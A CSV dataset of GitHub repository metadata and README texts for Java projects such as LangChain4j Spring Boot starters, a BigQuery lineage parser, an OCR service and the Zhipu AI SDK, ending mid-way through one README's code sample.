repo,branch,readme,releases_count,open_issues_count,branches_count,license
jocrugon/Pokedex,main,"# Pokedex
API desarrollado en java con spring boot, usando arquitectura hexagonal, swagger, manejador de excepciones y 2 bases de datos MySQL y MongoDB
las bases de datos están en el archivo docker-compose, también la creación de la imagen del API indicado en el Dockerfile

- SWAGGER

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/5ddeaab8-61ac-41cb-b435-452ebdf30091)

- Arquitectura Hexagonal

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/b692b471-88d9-43e6-9a75-4e8732a4cf4e)

- Docker

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/49cfcd81-be7a-4594-88db-892525dd5bd2)

",0,0,1,
MarchLiu/in-the-shell,main,,0,0,1,
ThomasVitale/langchain4j-spring-boot,main,"# LangChain4j Spring Boot

This project brings [LangChain4j](https://github.com/langchain4j) support in Spring Boot
to build AI and LLM-powered applications. It provides integrations with LLM services
and vector stores, as well as tools, chains, and AI services.

Using the starter projects in this repository, you gain the following advantages over
using the vanilla LangChain4j libraries in Spring Boot:

* Autoconfiguration and unified configuration properties for models and vector stores
* HTTP infrastructure with RestClient, WebClient, and Jackson for all integrations
* Built-in observability with Micrometer, including LLM-specific metrics and traces
* Dev services with Docker Compose and Testcontainers for models and vector stores
* Service bindings for automatic connection configuration when running on Kubernetes.

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* Docker/Podman
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application with LangChain4j support.

First, add the LangChain4j Spring Boot catalog providing the project templates.

```shell
spring project-catalog add langchain4j https://github.com/ThomasVitale/langchain4j-spring-boot
```

Then, create a new Spring Boot project for building an LLM Applications with LangChain4j and Ollama.

```shell
spring boot new myapp langchain4j-chat-ollama
```

Finally, navigate to the `myapp` folder and run the Spring Boot application. The first time you run it,
it will take a while to download the Ollama container image used as a dev service based on the Testcontainers
Spring Boot integration.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application that will use Ollama and _llama3_ to generate a text response.
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ai/chat message==""What is the capital of Italy?""
```

## 🦜 Models

### OpenAI

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-openai-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  open-ai:
    client:
      api-key: ${OPENAI_API_KEY}
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

### Ollama

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-ollama-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  ollama:
    chat:
      model: llama3
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

## 🫙 Vector Stores

### Chroma

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-chroma-spring-boot-starter:0.9.0'
```

Example:

```java
class ChromaDataIngestor {
    private final ChromaEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(ChromaEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

### Weaviate

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-weaviate-spring-boot-starter:0.9.0'
```

Example:

```java
class WeaviateDataIngestor {
    private final WeaviateEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(WeaviateEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

## 🌟 Examples

Check these [examples](https://github.com/ThomasVitale/llm-apps-java-langchain4j) to see LangChain4j and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",16,4,1,Apache-2.0
Laurc2004/ocr-ddd,master-cloud,"# OCR 项目 :sparkles:

## 📚 项目简介 :sunrise:

本项目是一个结合了DDD（领域驱动设计）架构理念的Java-Python跨界之作，旨在提供精准高效的OCR服务。

利用Python的[Paddle OCR](https://github.com/PaddlePaddle/PaddleOCR)库进行文字识别，该库以其高准确率和对复杂场景的适应性著称，能够轻松识别包括180°翻转在内的多种文本形式。

与此同时，Java部分采用了DDD架构，不仅加深了业务理解，也提升了代码的可维护性和扩展性。

前端则选用了Ant Design Pro，为用户提供流畅的交互体验。

前端代码仓库同样开源，欢迎您查阅和贡献：

- **前端项目地址**：[Laurc2004/ocr-frontend](https://github.com/Laurc2004/ocr-frontend) 使用Ant Design Pro构建，为用户带来极致的Web体验。

## 🔄 调用流程与功能说明 :gear:

### 💻 单体版本

- **公众号集成**：用户通过公众号发送图片或图片链接，根据引导即可启动OCR服务。
- **Python OCR引擎**：图片信息转发至Python后端，调用Paddle OCR进行文字识别。
- **Java处理逻辑**：识别结果被Java后端反序列化，提取关键信息并暂存于Redis（时效5分钟），利用线程池与Redission实现并发控制与流量限制。

### 🌐 微服务版本

- **Web界面操作**：用户访问Web界面，关注公众号后获取验证码登录，享受更丰富的功能。
- **用户认证与注册**：通过Spring Security实现安全验证，新用户自动注册。
- **多样化识别选项**：支持上传文件或输入URL，策略模式与工厂模式灵活选择处理策略，预留扩展接口如Base64识别。
- **结果输出定制**：提供专业模式输出详细坐标信息及文本识别分数，非专业模式则快速提取特定类型信息（如英文、车牌、身份证号等）。
- **支付与订单管理**：集成微信支付，采用EventBus解耦支付回调逻辑，配合定时任务处理异常订单。（前端暂时未做，本人微信商户到期）

## 🎨 功能展示 :framed_picture:

- **体验地址**：[在线体验](http://lixp.online:9888/)

- **截图预览**：
单体：
<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/6e9a1c79-c792-4b6d-870a-09333161afeb"" width=""400"">




微服务：





<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/144790bb-698d-4a5f-addd-701667df94a4"" width=""400"">

![image](https://github.com/Laurc2004/ocr-ddd/assets/119660750/4b65ddd4-9aae-4f26-a35f-19897c32ec19)

- **测试图片**：[示例图片](https://img0.pcauto.com.cn/pcauto/1812/25/14171817_paizhao.jpg)

## 🛠️ 软件架构 :wrench:

遵循DDD原则，项目分为四层：

- **触发层**：http、消息队列、定时任务等
- **应用层**：协调业务逻辑
- **领域层**：核心业务规则与实体
- **基础设施层**：数据库、缓存等

## 🔧 技术栈亮点 :key:

### Java & 中间件

- **Spring生态**：Spring Boot, MVC, Security
- **网络与数据**：Okhttp, Jackson, Mybatis, MySQL, Redis
- **API管理与文档**：Knife4j
- **开发辅助**：Lombok
- **消息传递**：EventBus（Guava）
- **配置与服务发现**：Nacos
- **流量控制**：Sentinel
- **分布式锁**：Redission

### Python

- **轻量级Web框架**：Flask
- **OCR库**：PaddleOCR

### 前端技术

- **React + Ant Design Pro**：构建现代Web应用
- **ArkTs**（规划中）：面向鸿蒙应用的TypeScript库
- **ReactNative**（规划中）：面向移动端

## 📖 安装部署教程 :book:

[1.0.0简易版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(1.0.0%E7%AE%80%E6%98%93%E7%89%88))
[2.0.0微服务版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(2.0.0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%89%88))

欢迎Star🌟 和Fork该项目，您的反馈与贡献是我们不断进步的动力！
",0,0,3,Apache-2.0
arconia-io/arconia,main,"# Arconia

Arconia is a framework to build SaaS, multitenant applications using Java and Spring Boot.

<img src=""arconia-logo.png"" alt=""The Arconia logo"" height=""250px"" />

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application using the Arconia framework.

First, add the Arconia Spring catalog providing the project templates.

```shell
spring project-catalog add arconia https://github.com/arconia-io/arconia
```

Then, create a new Spring Boot project for building a multitenant web application.

```shell
spring boot new myapp arconia-web
```

Finally, navigate to the `myapp` folder and run the Spring Boot application.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application as one of the valid tenants (`dukes` or `beans`).
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ X-TenantId:dukes
```

## 🌟 Examples

Check these [examples](https://github.com/arconia-io/arconia-samples) to see Arconia and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",5,9,1,Apache-2.0
iot/jetbra,main,,0,0,1,MIT
retrogemHK/codingtest_java,main,"# 코딩 테스트 합격자 되기(자바 편)
- 프로그래머스에서 엄선한 기출 문제에 대한 상세한 풀이 제공
- 들고 다닐 수 있는 요약 노트 제공
- 실전 문제 위주로 출제된 기출 문제 5회분 제공(회당 3 문제)


## 📖 도서 구매 링크
- Yes24 : https://www.yes24.com/Product/Goods/125183948
- 교보문고 : https://product.kyobobook.co.kr/detail/S000212576322
- 알라딘 : https://www.aladin.co.kr/shop/wproduct.aspx?ItemId=335109613
- 리디북스(Ebook) : https://ridibooks.com/books/4547000036

<img width=""464"" alt=""image"" src=""https://github.com/retrogemHK/codingtest_java/assets/14954690/16687a4f-c529-407c-a44b-15a9677f0eac"">

# 정오표
[클릭](https://docs.google.com/spreadsheets/d/16ZWyC2xlylfsGBdyt2YMT8ogpukNh7sXsHrfx5qQuFk/edit#gid=0)

# 책소개
![image](https://github.com/retrogemHK/codingtest_java/blob/main/assets/java_image.jpg)


# 진행중인 이벤트
| Event    | 세부내용                                    |기간 |
| ---------- | ---------------------------------------------- |---------------------------------------------- |
|코딩테스트 스터디       |[참여방법 및 스터디 세부사항](https://cafe.naver.com/dremdeveloper/948)              | 상시 |



# 코딩테스트 소통공간(저자가 직접운영)
| Title    | Description                                    |
| ---------- | ---------------------------------------------- |
|카카오톡 오픈채팅        |[클릭](https://open.kakao.com/o/gQOVhU3f)              |

# 연락처
- 해당 코드들에 대해 문의사항이 있거나, 연락이 필요한 경우 아래 참조

| Title             | Description                                     |
|-------------------|-------------------------------------------------|
| Cafe              | http://cafe.naver.com/dremdeveloper             |
| Business Mail     | kylados@naver.com                               |
| Codingtest Python | https://github.com/dremdeveloper/codingtest_python |
| Codingtest CPP    | https://github.com/dremdeveloper/codingtest_cpp |
# 폴더 구조
- 깃 허브의 폴더 구조에 대한 설명

| Title    | Description                                    |
| ---------- | ---------------------------------------------- |
| errorcode        | 구현시 자주 발생하는 에러메시지                |
| mistake        | 구현시 자주 실수할수 있는 사항                |
| performance        | 비슷한 동작을 하는데 시간복잡도가 다른 경우에 대한 시간비교             |
| reference        | 코딩테스트에서 많이 사용하는 문법                         |
| solution        | 책에 있는 문제에 대한 해설                         |
| Algorithm_with_DataStructure        | 코딩테스트에 등장하는 알고리즘과 자료구조                        |
",0,0,1,
borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.
",0,1,1,MIT
uncarbon97/helio-boot-modular,2.x,"# helio-boot-modular

## 项目介绍
基于 Spring Boot 3.x，是一款预置SaaS、RBAC能力的单体项目脚手架，适合初学者学习 JavaWeb 开发的良好实践  
按职责拆分为多Maven模块，依然是大单体，但命名及用途对标`helio-cloud`；适合多人协作、但不打算使用微服务架构的团队  
单模块版请移步至[helio-boot](https://github.com/uncarbon97/helio-boot)项目

JDK compatibility: 17 - 21

【[前端演示站](https://helio-demo.uncarbon.cc/)】
【[官方文档](https://helio.uncarbon.cc/)】 
【[主要技术栈依赖](https://helio.uncarbon.cc/#/i18n/zh-CN/helio-starters/dependencies)】
【[快速启动步骤](https://helio.uncarbon.cc/#/i18n/zh-CN/helio-boot/quick-start)】
【[更新记录](https://helio.uncarbon.cc/#/i18n/zh-CN/appendix/change-log)】
【[编码良好实践](https://helio.uncarbon.cc/#/i18n/zh-CN/experience/good-practices)】

需要先安装 `MySQL`、`Redis` 等必需中间件

基础支撑构件 [helio-starters](https://github.com/uncarbon97/helio-starters) 已推送至Maven中央仓库，加载时会自动拉取

## 配套后台管理前端模板 & 代码生成器
| 项目名                  | 简介                                                                          | Gitee                                                      | GitHub                                                       |
|----------------------|-----------------------------------------------------------------------------|------------------------------------------------------------|--------------------------------------------------------------|
| helio-generator      | 可一键生成单体or微服务版的前、后端代码，减少无谓的重复劳动                                              | [Gitee](https://gitee.com/uncarbon97/helio-generator)      | [GitHub](https://github.com/uncarbon97/helio-generator)      |
| helio-admin-vue-vben | 基于[Vue vben admin](https://github.com/anncwb/vue-vben-admin) 改造适配的前端框架，开箱即用 | [Gitee](https://gitee.com/uncarbon97/helio-admin-vue-vben) | [GitHub](https://github.com/uncarbon97/helio-admin-vue-vben) |

## 源码包结构
```
├───api
│   ├───admin-api  【Maven模块】admin-api，用于后台管理的HTTP-API
│   │   └───src
│   │       └───main
│   │           └───java
│   │               └───cc
│   │                   └───uncarbon
│   │                       └───module
│   │                           └───adminapi
│   │                               ├───aspect         自定义切面
│   │                               │   └───extension  自定义切面扩展类
│   │                               ├───constant       常量
│   │                               ├───helper         助手类
│   │                               ├───model          抽象模型
│   │                               │   └───response   用于响应的
│   │                               ├───util           静态工具类
│   │                               └───web            即：Controller
│   │                                   ├───auth       登录登出接口
│   │                                   ├───common     常用通用接口
│   │                                   ├───oss        对象存储接口
│   │                                   └───sys        预置系统管理接口（如：后台用户、后台角色、后台菜单等）
│   └───app-api 【Maven模块】app-api，用于C端的HTTP-API【只是一个骨架，并没有业务实现】
│       └───src
│           └───main
│               └───java
│                   └───cc
│                       └───uncarbon
│                           └───module
│                               └───appapi
│                                   ├───constant  常量
│                                   └───web       即：Controller
├───attachments  附件
│   └───db  数据库变更脚本
│       ├───MySQL
│       │   └───upgrade  Helio升级时MySQL变更脚本
│       └───PostgreSQL
│           └───upgrade  Helio升级时PostgreSQL变更脚本
├───bootstrap  【Maven模块】项目主入口，负责启动SpringBoot
│   └───src
│       ├───main
│       │   ├───java
│       │   │   └───cc
│       │   │       └───uncarbon
│       │   │           ├───config       全局配置类
│       │   │           └───interceptor  Web拦截器
│       │   └───resources  资源，包含符合Spring Boot标准的YAML配置文件、Logback配置文件等
│       │       └───i18n  国际化文案定义
├───service-module
│   ├───oss  【Maven模块】对象存储服务
│   │   ├───oss-facade  【Maven模块】对象存储服务门面
│   │   │   └───src
│   │   │       └───main
│   │   │           └───java
│   │   │               └───cc
│   │   │                   └───uncarbon
│   │   │                       └───module
│   │   │                           └───oss
│   │   │                               ├───constant  常量
│   │   │                               ├───enums     枚举
│   │   │                               ├───facade    门面
│   │   │                               └───model     抽象模型
│   │   │                                   ├───request   用于请求的
│   │   │                                   └───response  用于响应的
│   │   └───oss-service  【Maven模块】对象存储服务实现
│   │       └───src
│   │           └───main
│   │               └───java
│   │                   └───cc
│   │                       └───uncarbon
│   │                           └───module
│   │                               └───oss
│   │                                   ├───biz      门面实现类
│   │                                   ├───config   配置类
│   │                                   ├───entity   实体
│   │                                   ├───mapper   Mybatis Mapper
│   │                                   └───service  服务类
│   └───sys  【Maven模块】预置系统管理服务
│       ├───sys-facade  【Maven模块】预置系统管理服务门面
│       │   └───src
│       │       └───main
│       │           └───java
│       │               └───cc
│       │                   └───uncarbon
│       │                       └───module
│       │                           └───sys
│       │                               ├───annotation  自定义注解
│       │                               ├───constant    常量
│       │                               ├───enums       枚举
│       │                               ├───extension   自定义扩展
│       │                               │   └───impl    自定义扩展实现类
│       │                               ├───facade  门面
│       │                               └───model   抽象模型
│       │                                   ├───request   用于请求的
│       │                                   └───response  用于响应的
│       └───sys-service  【Maven模块】预置系统管理服务实现
│           └───src
│               └───main
│                   └───java
│                       └───cc
│                           └───uncarbon
│                               └───module
│                                   └───sys
│                                       ├───biz      门面实现类
│                                       ├───entity   实体
│                                       ├───mapper   Mybatis Mapper
│                                       │   └───xml  Mybatis Mapper XML
│                                       ├───service  服务类
│                                       └───util     静态工具类
```
",7,0,3,MulanPSL-2.0
sosow0212/2024-e-market,develop,"# E-market (24.01 ~ 05)

## 목차

1. [프로젝트 소개](#프로젝트-소개)
2. [개발 내용](#개발-내용)
    - [기능 개발](#기능-개발)
    - [아키텍처](#아키텍처)
3. [인프라](#인프라)
4. [테스트 및 커버리지](#테스트)

---    

## 프로젝트 소개

<p>
(1인 프로젝트)

아래 설문을 바탕으로 교내 중고 거래 서비스의 필요함을 인지하고 기획하게 된 대학생을 위한 교내 중고거래 플랫폼입니다.

학교와 제휴를 통해 쿠폰을 지급하고 교내 서적 및 필요한 비품을 저렴하게 구매할 수 있습니다.

<img width=""592"" alt=""스크린샷 2024-03-13 오후 8 44 22"" src=""https://github.com/sosow0212/2024-electronic-market/assets/63213487/0e01419e-841b-4373-befd-550660d435d9"">


</p>

--- 

## 개발 내용

### 기능 개발

- [x] 테스트 격리 유틸 생성 및 REST Docs Helper
  생성 ([해당 과정 포스팅 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223315262688&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원가입 및
  로그인 ([해당 과정 포스팅 및 고민한 점 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223317675973&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원가입 이메일 전송 비동기 구현 및 미전송 메일 처리해주는 기능
  구현 ([해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223322476947&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원 간 커뮤니티 기능 생성 및 동시성
  처리 ([다양한 동시성 처리 방법 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223328710499&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 쿠폰 기능 생성 및 금액 할인 도메인 서비스 구현
- [x] 마켓에 물품을 올리고 구매할 수 있는 기능 구현
- [x] 멀티모듈 분리 -> API, Batch 서버 ([멀티모듈로 분리한 이유](https://blog.naver.com/sosow0212/223401237314))
    - [x] 기존 이벤트를 Redis pub/sub으로 변경 ([Redis Pub/Sub로 이벤트 수신하기](https://blog.naver.com/sosow0212/223408645604))
    - [x] batch-server의 스케일아웃 환경에서 스케줄링 작업이 중복되는 문제 해결 ([스케줄링 중복 문제 해결](https://blog.naver.com/sosow0212/223408645604))

---

## 아키텍처

- **24.04.16 기준 서버 아키텍처**
    - 현재 SPOF 지점 : MySQL, Redis (개선 예정)
    - <img width=""1532"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/23a96925-4dbb-40ca-a41b-910a4bc7ac8a"">

---

### 인프라

- [x] Github Actions를 이용한 CI 환경
  생성 ([해당 과정 포스팅 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223314392944&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 인프라 환경 구축하기 1차
    - [x] Jenkins를 이용한 CD 환경
      구축 ([아키텍처 및 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223369462311&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
    - [x] Prometheus, Grafana 이용한 모니터링
      구축 ([아키텍처 및 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223369973401&categoryNo=161&parentCategoryNo=152&viewDate=&currentPage=1&postListTopCurrentPage=1&from=thumbnailList&userTopListOpen=true&userTopListCount=5&userTopListManageOpen=false&userTopListCurrentPage=1))
    - [x] Docker 이미지로 서버를 작동하도록 변경 및 무중단배포
      적용 ([새로운 아키텍처와 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223371181808&categoryNo=161&parentCategoryNo=152&viewDate=&currentPage=1&postListTopCurrentPage=1&from=thumbnailList&userTopListOpen=true&userTopListCount=5&userTopListManageOpen=false&userTopListCurrentPage=1)))

<img width=""1758"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/b2507a61-b6ca-45d1-bf08-704b66807069"">

---

## 테스트

- 24.04.16 기준 테스트 227개 및 커버리지 80% 이상

<img width=""838"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/89d4ccd8-f881-4a4b-adfc-a4b3d8ce9029"">

<img width=""655"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/967f8cfb-dd71-475d-821d-6767c87169d6"">
",0,5,59,
MetaGLM/zhipuai-sdk-java-v4,main,"# 智谱大模型开放接口SDK

智谱[开放平台](http://open.bigmodel.cn/howuse/platformintroduced)大模型接口Java SDK（Big Model API SDK in
Java），让开发者更便捷的调用智谱开放API

## 简介
- <font color=""red"">**java sdk仍在开发测试阶段，有bug请留言联系**</font>
- 对所有接口进行了类型封装，无需查阅API文档即可完成接入

## 安装

- 运行环境：JDK1.8+
- maven坐标
```
        <dependency>
            <groupId>cn.bigmodel.openapi</groupId>
            <artifactId>oapi-java-sdk</artifactId>
            <version>release-V4-2.3.0</version>
        </dependency>
```
### 依赖信息

```text
okhttp_3.14.9
java-jwt_4.2.2
jackson_2.11.3
retrofit2_2.9.0 
```
## 使用
- 调用流程：
    1. 使用APIKey创建Client
    2. 调用Client对应的成员方法
- [V4Test.java](src/test/java/com/zhipu/oapi/V4Test.java)有完整的demo示例，请替换自己的ApiKey进行测试


> SDK提供了ClientV4的构造器，此方法可以在创建Client时进行配置，可配置项如下：

 
- enableTokenCache：是否开启token缓存，开启后会缓存token，减少token请求次数
- networkConfig：设置连接超时、读取超时、写入超时、ping间隔、ping超时时间
- connectionPool：设置连接池

``` 
String API_SECRET_KEY = ""your api"";
private static final ClientV4 client = new ClientV4.Builder(API_SECRET_KEY) 
        .enableTokenCache()
        .networkConfig(30, 10, 10, 10, TimeUnit.SECONDS)
        .connectionPool(new okhttp3.ConnectionPool(8, 1, TimeUnit.SECONDS))
        .build();
 
```

### spring Controller 示例
```java
package com.zhipu.controller;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.wd.common.core.domain.R;
import com.zhipu.oapi.ClientV4;
import com.zhipu.oapi.service.v4.deserialize.MessageDeserializeFactory;
import com.zhipu.oapi.service.v4.model.ChatCompletionRequest;
import com.zhipu.oapi.service.v4.model.ModelApiResponse;
import com.zhipu.oapi.service.v4.model.ModelData;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

